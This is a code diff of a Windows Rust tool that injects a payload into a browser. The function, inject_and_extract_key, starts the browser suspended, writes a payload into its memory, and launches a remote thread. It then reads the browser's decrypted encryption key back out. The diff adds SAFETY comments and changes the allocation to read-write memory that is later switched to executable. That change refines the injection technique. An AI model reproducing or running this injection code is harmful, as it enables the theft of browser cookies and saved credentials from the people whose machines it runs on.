@@ -152,6 +152,7 @@ impl ProcessHandlesGuard {
     use windows::Win32::System::Threading::{TerminateProcess, WaitForSingleObject};
 
     if !self.terminated && !self.h_process.is_invalid() {
+      // SAFETY: `self.h_process` is a valid process handle owned by this guard.
       unsafe {
         let _ = TerminateProcess(self.h_process, exit_code);
         let _ = WaitForSingleObject(self.h_process, 2000);
@@ -168,11 +169,13 @@ impl Drop for ProcessHandlesGuard {
 
     self.terminate(1);
     if !self.h_thread.is_invalid() {
+      // SAFETY: `self.h_thread` is a valid thread handle owned by this guard that must be closed.
       unsafe {
         let _ = CloseHandle(self.h_thread);
       }
     }
     if !self.h_process.is_invalid() {
+      // SAFETY: `self.h_process` is a valid process handle owned by this guard that must be closed.
       unsafe {
         let _ = CloseHandle(self.h_process);
       }
@@ -188,6 +191,7 @@ impl Drop for RemoteThreadGuard {
   fn drop(&mut self) {
     use windows::Win32::Foundation::CloseHandle;
     if !self.0.is_invalid() {
+      // SAFETY: `self.0` is a valid remote thread handle owned by this guard that must be closed.
       unsafe {
         let _ = CloseHandle(self.0);
       }
@@ -200,9 +204,11 @@ fn patch_preresolved_imports(payload: &[u8]) -> Result<Vec<u8>> {
   use windows::core::PCSTR;
   use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
 
+  // SAFETY: Loading standard Windows DLLs `kernel32.dll` and `ntdll.dll` by module name.
   let kernel32 = unsafe { GetModuleHandleA(PCSTR(c"kernel32.dll".as_ptr().cast())) }?;
   let ntdll = unsafe { GetModuleHandleA(PCSTR(c"ntdll.dll".as_ptr().cast())) }?;
 
+  // SAFETY: Resolving standard export symbols from loaded DLLs kernel32 and ntdll.
   let p_load_library_a =
     unsafe { GetProcAddress(kernel32, PCSTR(c"LoadLibraryA".as_ptr().cast())) };
   let p_get_proc_address =
@@ -272,7 +278,8 @@ pub fn inject_and_extract_key(
   use windows::Win32::Foundation::{WAIT_OBJECT_0, WAIT_TIMEOUT};
   use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
   use windows::Win32::System::Memory::{
-    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
+    VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
+    PAGE_READWRITE,
   };
   use windows::Win32::System::Threading::{
     CreateProcessW, CreateRemoteThread, ResumeThread, WaitForSingleObject, CREATE_SUSPENDED,
@@ -307,6 +314,8 @@ pub fn inject_and_extract_key(
   let mut pi = PROCESS_INFORMATION::default();
 
   let creation_flags = CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT;
+  // SAFETY: `app_name_w` and `cmd_line_w` are null-terminated wide strings, `env_block` is a valid
+  // double-null-terminated Unicode environment block, and `si`/`pi` are correctly sized and initialized structs.
   let created = unsafe {
     CreateProcessW(
       PCWSTR(app_name_w.as_ptr()),
@@ -334,13 +343,15 @@ pub fn inject_and_extract_key(
 
   runtime.check()?;
 
+  // Allocate read-write memory first to avoid initial RWX allocation.
+  // SAFETY: `pi.hProcess` is the valid handle to the newly created target browser process.
   let remote_base = unsafe {
     VirtualAllocEx(
       pi.hProcess,
       None,
       patched_payload.len(),
       MEM_COMMIT | MEM_RESERVE,
-      PAGE_EXECUTE_READWRITE,
+      PAGE_READWRITE,
     )
   };
 
@@ -349,6 +360,8 @@ pub fn inject_and_extract_key(
   }
 
   let mut written = 0;
+  // SAFETY: `pi.hProcess` is a valid process handle, `remote_base` is the newly allocated remote region,
+  // and `patched_payload` is a valid host byte slice.
   let write_ok = unsafe {
     WriteProcessMemory(
       pi.hProcess,
@@ -367,7 +380,26 @@ pub fn inject_and_extract_key(
     );
   }
 
+  // Change protection to write-then-execute (PAGE_EXECUTE_READWRITE is required because Bootstrap
+  // executes within this image and writes progress markers and the decrypted key back into the DOS scratch space).
+  let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
+  // SAFETY: `pi.hProcess` is a valid process handle and `remote_base` contains the written payload bytes.
+  let protect_ok = unsafe {
+    VirtualProtectEx(
+      pi.hProcess,
+      remote_base,
+      patched_payload.len(),
+      PAGE_EXECUTE_READWRITE,
+      &mut old_protect,
+    )
+  };
+
+  if protect_ok.is_err() {
+    bail!("VirtualProtectEx failed in target browser process");
+  }
+
   // Resume the main thread briefly so ntdll loader initialization completes
+  // SAFETY: `pi.hThread` is a valid thread handle of the target process.
   unsafe {
     let _ = ResumeThread(pi.hThread);
   }
@@ -380,6 +412,8 @@ pub fn inject_and_extract_key(
 
   let entry_addr = (remote_base as usize + bootstrap_offset) as *const ();
   let mut thread_id = 0;
+  // SAFETY: `pi.hProcess` is a valid process handle. `entry_addr` points to the exported `Bootstrap`
+  // entry function within the injected payload, matching the thread start routine signature.
   let remote_thread = unsafe {
     CreateRemoteThread(
       pi.hProcess,
@@ -424,6 +458,7 @@ pub fn inject_and_extract_key(
       .unwrap_or(u32::MAX)
       .max(1);
 
+    // SAFETY: `remote_thread.0` is a valid, live remote thread handle.
     let wait_state = unsafe { WaitForSingleObject(remote_thread.0, wait_ms) };
     if wait_state == WAIT_OBJECT_0 {
       break;
@@ -442,6 +477,8 @@ pub fn inject_and_extract_key(
   // Read scratch result
   let mut hdr = [0u8; 12];
   let mut read_bytes = 0;
+  // SAFETY: `pi.hProcess` is a valid process handle, `remote_base + BOOTSTRAP_MARKER_OFFSET` points to
+  // the scratch diagnostic header in the remote process, and `hdr` has 12 bytes capacity.
   let read_hdr_ok = unsafe {
     ReadProcessMemory(
       pi.hProcess,
@@ -474,6 +511,8 @@ pub fn inject_and_extract_key(
   if status == BOOTSTRAP_KEY_STATUS_READY {
     let mut key_buf = vec![0u8; BOOTSTRAP_KEY_LEN];
     let mut key_read_bytes = 0;
+    // SAFETY: `pi.hProcess` is a valid process handle, `remote_base + BOOTSTRAP_KEY_OFFSET` points to
+    // the 32-byte key buffer in the remote process, and `key_buf` has BOOTSTRAP_KEY_LEN capacity.
     let read_key_ok = unsafe {
       ReadProcessMemory(
         pi.hProcess,
